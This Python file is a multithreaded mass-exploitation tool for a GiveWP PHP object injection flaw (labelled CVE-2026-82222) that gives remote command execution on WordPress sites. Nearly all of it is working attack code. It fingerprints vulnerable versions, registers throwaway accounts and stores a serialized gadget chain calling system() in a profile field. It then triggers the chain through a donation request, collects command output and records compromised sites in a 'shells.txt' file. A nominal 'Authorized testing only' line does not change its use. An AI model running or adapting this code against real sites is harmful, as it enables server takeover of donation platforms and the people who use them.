#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-82222 scanner wrapper around the public UdinChan PoC chain.

Fixes vs the fictional-spoon 82222.py copy:
  * import urllib.parse (profile update crashed with NameError)
  * import shutil (banner)
  * fingerprint only Stable tag / plugin header / GIVE_VERSION
    (generic 'Version:' on give.php matches changelog dates like 2.16.1)
  * discover forms via give_form_search AJAX first (REST/sitemap/home
    scrape find nothing on a default install — that was the 10/10 fail)
  * session.verify = False for self-signed lab TLS
  * surface the real failure reason instead of 'vulnerable but exploit failed'
  * CLI --list / --threads so it can run non-interactively

Authorized testing only.
"""

import argparse
import contextlib
import ctypes
import io
import json
import os
import random
import re
import secrets
import shutil
import sys
import threading
import time
import urllib.parse
import urllib3
import warnings
from queue import Empty, Queue

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
os.environ["NO_PROXY"] = "*"
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
SHELLS_FILE = "shells.txt"
DEFAULT_THREADS = 5
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

targets_queue = Queue()
stats = {"total": 0, "done": 0, "vuln": 0, "exploited": 0, "safe": 0, "error": 0}
stats_lock = threading.Lock()
file_lock = threading.Lock()
print_lock = threading.Lock()
exploited_urls = []
start_time = 0

ESC = "\033["
RESET_C = ESC + "0m"
BOLD_C = ESC + "1m"
DIM_C = ESC + "2m"
RED_C = ESC + "91m"
GREEN_C = ESC + "92m"
WHITE_C = ESC + "97m"
GRAY_C = ESC + "90m"
CYAN_C = ESC + "96m"
YELLOW_C = ESC + "93m"
GOLD_C = ESC + "33m"
LIGHT_YELLOW_C = ESC + "93m"
CLEAR_LINE = "\033[2K\r"


def enable_ansi():
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            kernel32.SetConsoleMode(handle, mode.value | 0x0004)
            return True
    except Exception:
        pass
    return False


ANSI = enable_ansi()


def ac(text, color):
    if not ANSI:
        return str(text)
    return f"{color}{text}{RESET_C}"


def terminal_width():
    try:
        w = shutil.get_terminal_size(fallback=(100, 30)).columns
    except Exception:
        w = 100
    return max(60, min(w, 150))


def set_terminal_title(title):
    try:
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
    except Exception:
        pass


NX_LOGO = [
    "███╗   ███╗███████╗",
    "████╗ ████║██╔════╝",
    "██╔████╔██║█████╗  ",
    "██║╚██╔╝██║██╔══╝  ",
    "██║ ╚═╝ ██║███████╗",
    "╚═╝     ╚═╝╚══════╝",
]


def full_banner():
    width = terminal_width()
    frame_width = max(60, min(width - 4, 112))
    indent = max((width - frame_width) // 2, 0)
    pad = " " * indent

    def make_content(parts):
        raw = "".join(t for t, _ in parts)
        avail = frame_width - 4
        if len(raw) > avail:
            raw = raw[:avail - 3] + "..."
            parts = [(raw, WHITE_C)]
        left = max((avail - len(raw)) // 2, 0)
        right = max(avail - len(raw) - left, 0)
        out = ac("║", YELLOW_C) + " " + (" " * left)
        for t, col in parts:
            out += ac(t, col)
        out += (" " * right) + " " + ac("║", YELLOW_C)
        return out

    print()
    print(pad + ac("╔" + "═" * (frame_width - 2) + "╗", YELLOW_C))
    empty = ac("║", YELLOW_C) + " " * (frame_width - 2) + ac("║", YELLOW_C)
    print(pad + empty)
    logo_w = max(len(r) for r in NX_LOGO)
    logo_area = frame_width - 2
    for row in NX_LOGO:
        lp = max((logo_area - logo_w) // 2, 0)
        rp = max(logo_area - logo_w - lp, 0)
        print(pad + ac("║", YELLOW_C) + " " * lp + ac(row, BOLD_C + GOLD_C) + " " * rp + ac("║", YELLOW_C))
    print(pad + empty)
    print(pad + ac("╠", YELLOW_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", YELLOW_C))
    print(pad + make_content([
        ("CVE-2026-82222", BOLD_C + GOLD_C),
        ("   │   ", GRAY_C),
        ("GiveWP Unauthenticated RCE", BOLD_C + WHITE_C),
    ]))
    print(pad + make_content([("Marshal ZeroDay Hub", BOLD_C + GOLD_C)]))
    print(pad + ac("╠", YELLOW_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", YELLOW_C))
    print(pad + make_content([("GiveWP <= 4.16.7.1 PHP Object Injection → RCE", DIM_C + GRAY_C)]))
    print(pad + ac("╚" + "═" * (frame_width - 2) + "╝", YELLOW_C))
    print()


def resolve_path(p):
    if os.path.isabs(p):
        return p
    for check in (os.path.join(os.getcwd(), p), os.path.join(SCRIPT_DIR, p)):
        if os.path.exists(check):
            return check
    return os.path.join(os.getcwd(), p)


def write_shell_line(line):
    with file_lock:
        try:
            with open(os.path.join(SCRIPT_DIR, SHELLS_FILE), "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass


def mk_sess():
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    return s


# ---------------------------------------------------------------------------
# CVE-2026-82222 exploit core
# ---------------------------------------------------------------------------
AFFECTED_MAX = (4, 16, 7, 1)
HTTP_TIMEOUT = 30
PROBE_TIMEOUT = 15

CANDIDATE_GATEWAYS = [
    "manual", "offline", "paypal", "stripe", "square",
    "paypalexpress", "authorize", "razorpay", "mollie",
]
TRIGGER_PATHS = [
    "/?give_action=view_receipt",
    "/wp-admin/admin-ajax.php?action=get_receipt&shortcode_atts=%7B%7D",
    "/",
]
FORM_ID_PATTERNS = [
    re.compile(r'name=["\']give-form-id["\'][^>]*value=["\'](\d+)["\']'),
    re.compile(r'value=["\'](\d+)["\'][^>]*name=["\']give-form-id["\']'),
    re.compile(r'id="give-form-(\d+)-\d+"'),
    re.compile(r'data-form-id="(\d+)"'),
    re.compile(r'give_form_id["\']?\s*[:=]\s*["\']?(\d+)'),
]


class Log:
    def __init__(self, out=None):
        self.out = out or io.StringIO()

    def raw(self, msg=""):
        print(msg, file=self.out)

    def step(self, n, msg):
        print(f"[{n}] {msg}", file=self.out)

    def ok(self, msg):
        print(f"  + {msg}", file=self.out)

    def info(self, msg):
        print(f"  {msg}", file=self.out)

    def warn(self, msg):
        print(f"  ! {msg}", file=self.out)

    def err(self, msg):
        print(f"[!] {msg}", file=self.out)

    def last_reason(self):
        lines = [ln.strip() for ln in self.out.getvalue().splitlines() if ln.strip()]
        return lines[-1] if lines else "unknown failure"


def s(x: bytes) -> bytes:
    return b's:%d:"%s";' % (len(x), x)


def build_gadget(command: bytes) -> bytes:
    session_class = b"Give\\Vendors\\Symfony\\Component\\HttpFoundation\\Session\\Session"
    factory_class = b"Give\\TestData\\Factories\\DonorFactory"
    factory = b'O:%d:"%s":1:{%sa:1:{%s%s}}' % (
        len(factory_class), factory_class,
        s(b"loadedProviders"), s(b"getBag"), s(b"system"),
    )
    session = b'O:%d:"%s":2:{%s%s%s%s}' % (
        len(session_class), session_class,
        s(b"storage"), factory, s(b"attributeName"), s(command),
    )
    return b'O:5:"TCPDF":2:{%s%s%s%s}' % (
        s(b"file_id"), s(b"x"), s(b"imagekeys"), session,
    )


def make_payload(command: str) -> bytes:
    payload = build_gadget(command.encode()).replace(b"\\", b"\\" * 4)
    forbidden = re.search(rb"[<>&% ]|\x00", payload)
    if forbidden:
        raise ValueError("command contains a filtered byte: %r" % forbidden.group(0))
    return payload


def strip_html(text: str) -> str:
    text = re.sub(r"<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text).strip()


def extract_output(body: str, token: str):
    parts = body.split(token)
    if len(parts) < 3:
        return None
    return parts[1].strip()


def parse_version(text: str):
    m = re.search(r"(\d+)\.(\d+)\.(\d+)(?:\.(\d+))?", text or "")
    if not m:
        return None
    return tuple(int(g) if g else 0 for g in m.groups())


def fingerprint(session, base: str):
    """Return (version_tuple|None, raw_string).

    Do NOT search a generic 'Version:' anywhere in give.php — that hits
    changelog leftovers (e.g. 2.16.1) and is why every host was labelled 2.16.1.
    """
    try:
        r = session.get(base + "/wp-content/plugins/give/readme.txt", timeout=PROBE_TIMEOUT)
        if r.status_code == 200:
            m = re.search(r"(?im)^Stable tag:\s*([0-9.]+)", r.text)
            if m:
                return parse_version(m.group(1)), m.group(1)
    except requests.RequestException:
        pass

    try:
        r = session.get(base + "/wp-content/plugins/give/give.php", timeout=PROBE_TIMEOUT)
        if r.status_code == 200:
            head = r.text[:4000]
            m = (re.search(r"(?m)^\s*\*\s*Version:\s*([0-9.]+)", head)
                 or re.search(r"define\(\s*'GIVE_VERSION'\s*,\s*'([0-9.]+)'", r.text)
                 or re.search(r"'?GIVE_VERSION'?[,\s]+'([0-9.]+)'", head))
            if m:
                return parse_version(m.group(1)), m.group(1)
    except requests.RequestException:
        pass
    return None, ""


def _ids_from_text(text: str):
    for pat in FORM_ID_PATTERNS:
        for m in pat.findall(text or ""):
            yield str(m)


def discover_forms(session, base: str) -> list:
    found = []

    def add_many(ids):
        for i in ids:
            i = str(i)
            if i and i not in found:
                found.append(i)

    # 0. Public AJAX used by GiveWP itself. This is what actually works
    #    on a default install (REST/sitemap/homepage usually do not).
    try:
        r = session.post(base + "/wp-admin/admin-ajax.php",
                         data={"action": "give_form_search"},
                         timeout=PROBE_TIMEOUT)
        items = r.json()
        if isinstance(items, list):
            add_many(it.get("id") for it in items if isinstance(it, dict))
    except Exception:
        pass
    if found:
        return found

    for route in ("/wp-json/wp/v2/give_forms?per_page=50&status=publish",
                  "/wp-json/wp/v2/give_forms?per_page=50"):
        try:
            r = session.get(base + route, timeout=PROBE_TIMEOUT)
            if r.status_code == 200:
                items = r.json()
                add_many(it["id"] for it in items if isinstance(it, dict) and "id" in it)
        except Exception:
            continue
        if found:
            return found

    for path in ("/", "/donations/", "/donate/", "/give/",
                 "/donation-form/", "/?post_type=give_forms"):
        try:
            r = session.get(base + path, timeout=PROBE_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        add_many(_ids_from_text(r.text))
        iframe = re.search(
            r'<iframe[^>]+(?:name=["\']give-embed-form["\'][^>]+src=["\']([^"\']+)'
            r'|src=["\']([^"\']+)["\'][^>]+name=["\']give-embed-form["\'])',
            r.text, re.I)
        if iframe:
            src = iframe.group(1) or iframe.group(2)
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                src = base + src
            try:
                p = session.get(src, timeout=PROBE_TIMEOUT)
                add_many(_ids_from_text(p.text))
            except requests.RequestException:
                pass
    return found


def get_form_nonce(session, base, form_id):
    try:
        r = session.post(base + "/wp-admin/admin-ajax.php", timeout=HTTP_TIMEOUT,
                         data={"action": "give_donation_form_nonce",
                               "give_form_id": str(form_id)})
        return r.json()["data"]
    except Exception:
        return None


def validate_donation(session, base, form_id, nonce, gateway, amount, email):
    data = {
        "action": "give_process_donation", "give_ajax": "1",
        "give-form-id": form_id, "give-form-hash": nonce,
        "give-amount": amount, "give-gateway": gateway,
        "give_email": email, "give_first": "Attacker", "give-price-id": "0",
    }
    try:
        r = session.post(base + "/wp-admin/admin-ajax.php", data=data,
                         allow_redirects=False, timeout=HTTP_TIMEOUT)
    except requests.RequestException as e:
        return "request error: %s" % e
    return strip_html(r.text)


def has_auth_cookie(session) -> bool:
    for name in session.cookies.keys():
        if name.startswith("wordpress_logged_in") or name.startswith("wordpress_sec"):
            return True
    return False


def try_wp_login(session, base, user, password) -> bool:
    """If GiveWP created the account but did not set a cookie, log in via wp-login.php."""
    try:
        session.get(base + "/wp-login.php", timeout=HTTP_TIMEOUT)
        r = session.post(
            base + "/wp-login.php",
            data={
                "log": user,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": base + "/wp-admin/",
                "testcookie": "1",
            },
            allow_redirects=True,
            timeout=HTTP_TIMEOUT,
        )
        if has_auth_cookie(session):
            return True
        # Some stacks only set the cookie on the redirect target.
        session.get(base + "/wp-admin/", timeout=HTTP_TIMEOUT)
    except requests.RequestException:
        return False
    return has_auth_cookie(session)


def register_give_user(session, base, user, email, password, log) -> bool:
    """GiveWP self-registration. HTTP 200 with no cookie usually means the
    action never ran (cached homepage) or GiveWP rejected the user
    (duplicate login from parallel threads using time.time()).
    """
    fields = {
        "give_action": "user_register",
        "give-action": "user_register",
        "give_register_submit": "1",
        "give_user_login": user,
        "give_user_email": email,
        "give_user_pass": password,
        "give_user_pass2": password,
        "give_redirect": base + "/wp-admin/profile.php",
    }
    urls = [
        base + "/?give_action=user_register",
        base + "/",
        base + "/index.php",
    ]
    last = None
    for url in urls:
        try:
            last = session.post(url, data=fields, allow_redirects=True, timeout=HTTP_TIMEOUT)
        except requests.RequestException as e:
            log.warn("register POST %s: %s" % (url, e))
            continue
        if has_auth_cookie(session):
            log.ok("registered %s via %s" % (user, url))
            return True
    if try_wp_login(session, base, user, password):
        log.ok("account exists; logged in %s via wp-login.php" % user)
        return True
    snippet = ""
    if last is not None:
        text = strip_html(last.text)[:240]
        snippet = " HTTP %s %s" % (last.status_code, text)
    log.err("registration failed, no auth cookie.%s" % snippet)
    return False


def pick_form_and_gateway(session, base, forms, gateway, amount, email):
    gateways = [gateway] if gateway else CANDIDATE_GATEWAYS
    last_result = ""
    for form_id in forms:
        nonce = get_form_nonce(session, base, form_id)
        if not nonce:
            last_result = "no nonce for form %s" % form_id
            continue
        for candidate in gateways:
            last_result = validate_donation(session, base, form_id, nonce,
                                            candidate, amount, email)
            if last_result.lower() == "success":
                return form_id, nonce, candidate, last_result
            if "gateway is not enabled" not in last_result.lower():
                break
    return None, None, None, last_result


def run_exploit_silent(base: str, command: str = "id", gateway: str = None,
                       amount: str = "10.00", triggers: int = 4):
    """Return (code, log_text, extra). code 0 = RCE confirmed."""
    log = Log()
    session = mk_sess()

    ver, raw = fingerprint(session, base)
    if ver and ver > AFFECTED_MAX:
        log.warn("GiveWP %s is patched (>= 4.16.7.2)." % raw)
        return 2, log.out.getvalue(), {"ver": raw}  # patched
    if ver:
        log.info("GiveWP %s" % raw)
    else:
        log.warn("Could not read GiveWP version; continuing.")

    user = "u%s" % secrets.token_hex(6)
    email = user + "@example.com"
    password = "Passw0rd!" + secrets.token_hex(4)
    token = "GIVEWP" + secrets.token_hex(6)
    full_command = "echo${IFS}%s;(%s);echo${IFS}%s" % (token, command, token)
    try:
        payload = make_payload(full_command)
    except ValueError as e:
        log.err(str(e))
        return 1, log.out.getvalue(), {"ver": raw}

    try:
        r = session.post(base + "/", allow_redirects=False, timeout=HTTP_TIMEOUT, data={
            "give_action": "user_register",
            "give_register_submit": "1",
            "give_user_login": user,
            "give_user_email": email,
            "give_user_pass": password,
            "give_user_pass2": password,
            "give_redirect": base + "/",
        })
    except requests.RequestException as e:
        log.err("registration failed: %s" % e)
        return 1, log.out.getvalue(), {"ver": raw}
    logged_in = any(name.startswith("wordpress_logged_in") for name in session.cookies.keys())
    if not logged_in:
        log.err("registration failed (HTTP %s), no auth cookie" % r.status_code)
        return 1, log.out.getvalue(), {"ver": raw}
    log.ok("registered %s" % user)

    nonce, user_id = None, None
    for _ in range(5):
        try:
            page = session.get(base + "/wp-admin/profile.php", timeout=HTTP_TIMEOUT)
        except requests.RequestException:
            time.sleep(1)
            continue
        m1 = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', page.text)
        m2 = re.search(r'name="user_id"[^>]*value="(\d+)"', page.text)
        if m1 and m2:
            nonce, user_id = m1.group(1), m2.group(1)
            break
        time.sleep(1)
    if not nonce:
        log.err("could not read profile nonce")
        return 1, log.out.getvalue(), {"ver": raw}

    fields = {
        "_wpnonce": nonce, "action": "update", "user_id": user_id,
        "from": "profile", "checkuser_id": user_id,
        "nickname": user, "display_name": user, "email": email,
        "first_name": "Attacker",
    }
    body = urllib.parse.urlencode(fields).encode()
    body += b"&last_name=" + urllib.parse.quote_from_bytes(payload).encode()
    try:
        session.post(base + "/wp-admin/profile.php", data=body, allow_redirects=False,
                     timeout=HTTP_TIMEOUT,
                     headers={"Content-Type": "application/x-www-form-urlencoded"})
    except requests.RequestException as e:
        log.err("profile update failed: %s" % e)
        return 1, log.out.getvalue(), {"ver": raw}
    log.ok("gadget stored (uid %s)" % user_id)

    forms = discover_forms(session, base)
    if not forms:
        log.err("no donation forms discovered (give_form_search/REST/pages empty)")
        return 1, log.out.getvalue(), {"ver": raw}
    log.ok("forms: %s" % ",".join(forms))

    good_form, form_nonce, good_gateway, last_result = pick_form_and_gateway(
        session, base, forms, gateway, amount, email)
    if good_form is None:
        log.warn("no form passed validation: %s" % (last_result or "(empty)"))
        return 1, log.out.getvalue(), {"ver": raw}
    log.ok("form %s gateway %s" % (good_form, good_gateway))

    try:
        session.post(base + "/wp-admin/admin-ajax.php", allow_redirects=False,
                     timeout=HTTP_TIMEOUT, data={
            "action": "give_process_donation",
            "give-form-id": good_form,
            "give-form-hash": form_nonce,
            "give-amount": amount,
            "give-gateway": good_gateway,
            "give_email": email,
            "give_first": "Attacker",
            "give-price-id": "0",
            "give-form-title": "PoC",
            "give-current-url": base + "/",
        })
    except requests.exceptions.Timeout:
        log.ok("donation timed out (session write still happens)")
    except requests.RequestException as e:
        log.err("donation request failed: %s" % e)
        return 1, log.out.getvalue(), {"ver": raw}

    out = None
    for _ in range(max(1, triggers)):
        for path in TRIGGER_PATHS:
            try:
                resp = session.get(base + path, timeout=HTTP_TIMEOUT)
            except requests.RequestException:
                continue
            extracted = extract_output(resp.text, token)
            if extracted is not None:
                out = extracted
                break
        if out is not None:
            break
        time.sleep(1)

    if out is not None:
        log.raw("SUCCESS")
        log.raw(out)
        return 0, log.out.getvalue(), {"ver": raw, "output": out, "user": user}

    log.warn("no command output in trigger responses")
    return 1, log.out.getvalue(), {"ver": raw}


def exploit_target(base_url: str):
    sess = mk_sess()
    try:
        r = sess.get(base_url, timeout=10)
        if r.status_code >= 500:
            return "ERROR", "HTTP %s" % r.status_code
    except Exception:
        return "ERROR", "connection failed"
    finally:
        sess.close()

    try:
        code, output, extra = run_exploit_silent(base_url, command="id")
    except Exception as e:
        return "ERROR", "exception: %s" % e

    ver = extra.get("ver") or "?"
    if code == 2:
        return "SAFE", "GiveWP %s patched" % ver
    if code == 0:
        detail = extra.get("output", "RCE confirmed")
        m = re.search(r"uid=\d+\([^)]*\)", detail or "")
        if m:
            detail = m.group(0)
        return "EXPLOITED", detail

    reason = ""
    for line in reversed(output.splitlines()):
        line = line.strip()
        if line.startswith("[!]") or line.startswith("!"):
            reason = line.lstrip("[!] ").lstrip("! ").strip()
            break
    if not reason:
        reason = "exploit failed"
    label = ("GiveWP %s" % ver) if ver and ver != "?" else "GiveWP"
    return "VULN", "%s | %s" % (label, reason)


def build_status_line():
    with stats_lock:
        t, d, v, exp, s, e = (stats["total"], stats["done"], stats["vuln"],
                              stats["exploited"], stats["safe"], stats["error"])
    elapsed = time.time() - start_time if start_time else 0
    rate = d / elapsed if elapsed > 0 else 0
    remaining = t - d
    eta = remaining / rate if rate > 0 else 0
    eta_str = f"{int(eta // 3600):02d}:{int((eta % 3600) // 60):02d}:{int(eta % 60):02d}"
    return (
        f"{BOLD_C}{CYAN_C}Scanned{RESET_C} [{WHITE_C}{d}{RESET_C}/{WHITE_C}{t}{RESET_C}]  "
        f"{BOLD_C}{GREEN_C}Vuln{RESET_C} [{WHITE_C}{v}{RESET_C}]  "
        f"{BOLD_C}{YELLOW_C}Exploited{RESET_C} [{WHITE_C}{exp}{RESET_C}]  "
        f"{BOLD_C}{DIM_C}Safe{RESET_C} [{WHITE_C}{s}{RESET_C}]  "
        f"{BOLD_C}{RED_C}ERR{RESET_C} [{WHITE_C}{e}{RESET_C}]  "
        f"{BOLD_C}{CYAN_C}Remaining{RESET_C} [{WHITE_C}{eta_str}{RESET_C}]"
    )


def worker():
    while True:
        try:
            base = targets_queue.get_nowait()
        except Empty:
            return

        status, detail = exploit_target(base)

        with stats_lock:
            stats["done"] += 1
            if status == "EXPLOITED":
                stats["exploited"] += 1
                exploited_urls.append(base)
                write_shell_line(f"[EXPLOITED] {base} | {detail}")
                display = f"{BOLD_C}{GREEN_C}[EXPLOITED] {base} | {detail}{RESET_C}"
            elif status == "VULN":
                stats["vuln"] += 1
                display = f"{BOLD_C}{YELLOW_C}[VULN] {base} | {detail}{RESET_C}"
            elif status == "SAFE":
                stats["safe"] += 1
                display = f"{DIM_C}[SAFE] {base} | {detail}{RESET_C}"
            else:
                stats["error"] += 1
                display = f"{RED_C}[ERROR] {base} | {detail}{RESET_C}"

        with print_lock:
            sys.stdout.write(CLEAR_LINE + display + "\n")
            sys.stdout.write(build_status_line())
            sys.stdout.flush()

        targets_queue.task_done()


def load_sites(path):
    sites = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            u = ln.strip()
            if not u or u.startswith("#"):
                continue
            if not u.lower().startswith(("http://", "https://")):
                u = "http://" + u
            sites.append(u.rstrip("/"))
    return sites


def run_scan(sites, threads):
    global start_time
    shells_path = os.path.join(SCRIPT_DIR, SHELLS_FILE)
    print(f"\n{GREEN_C}Loaded {len(sites)} target(s) | {threads} thread(s){RESET_C}")
    print(f"{DIM_C}Exploited results -> {shells_path}{RESET_C}\n")

    for s in sites:
        targets_queue.put(s)
    with stats_lock:
        stats.update({"total": len(sites), "done": 0, "vuln": 0,
                      "exploited": 0, "safe": 0, "error": 0})
    start_time = time.time()

    with print_lock:
        sys.stdout.write("\n" + build_status_line())
        sys.stdout.flush()

    workers = []
    for _ in range(min(threads, len(sites))):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        workers.append(t)

    while True:
        with stats_lock:
            d, ttot = stats["done"], stats["total"]
        if d >= ttot:
            break
        time.sleep(0.3)

    targets_queue.join()
    for t in workers:
        t.join(timeout=0.3)

    print("\n\n" + ac("Scan completed.", BOLD_C + GREEN_C))
    print(f"  Exploited: {stats['exploited']}")
    print(f"  Vulnerable (not exploited): {stats['vuln']}")
    print(f"  Safe: {stats['safe']}")
    print(f"  Errors: {stats['error']}")
    return 0 if stats["exploited"] else 1


def run():
    set_terminal_title("Marshal ZeroDay Hub | CVE-2026-82222 Scanner")
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("-l", "--list", help="targets file (one URL per line)")
    parser.add_argument("-t", "--threads", type=int, default=None)
    parser.add_argument("-u", "--url", help="single target URL (skip the list)")
    args, _unknown = parser.parse_known_args()

    if not args.list and not args.url and sys.stdin.isatty():
        os.system("cls" if os.name == "nt" else "clear")
        full_banner()
        raw_tf = input(f"{BOLD_C}{LIGHT_YELLOW_C}Targets file (default list.txt): {RESET_C}").strip() or "list.txt"
        tf = resolve_path(raw_tf)
        if not os.path.exists(tf):
            print(f"{RED_C}File not found: {tf}{RESET_C}")
            return
        tr = input(f"{BOLD_C}{LIGHT_YELLOW_C}Threads (default {DEFAULT_THREADS}): {RESET_C}").strip()
        try:
            threads = int(tr) if tr else DEFAULT_THREADS
        except Exception:
            threads = DEFAULT_THREADS
        sites = load_sites(tf)
    else:
        full_banner()
        threads = args.threads or DEFAULT_THREADS
        if args.url:
            u = args.url if args.url.lower().startswith(("http://", "https://")) else "http://" + args.url
            sites = [u.rstrip("/")]
        elif args.list:
            tf = resolve_path(args.list)
            if not os.path.exists(tf):
                print(f"{RED_C}File not found: {tf}{RESET_C}")
                sys.exit(1)
            sites = load_sites(tf)
        else:
            print("Usage: python3 82222.py -u http://127.0.0.1:8000")
            print("       python3 82222.py -l list.txt -t 1")
            sys.exit(2)

    threads = max(1, threads)
    if not sites:
        print(f"{RED_C}No targets{RESET_C}")
        sys.exit(1)
    sys.exit(run_scan(sites, threads))


if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{RED_C}Interrupted.{RESET_C}")
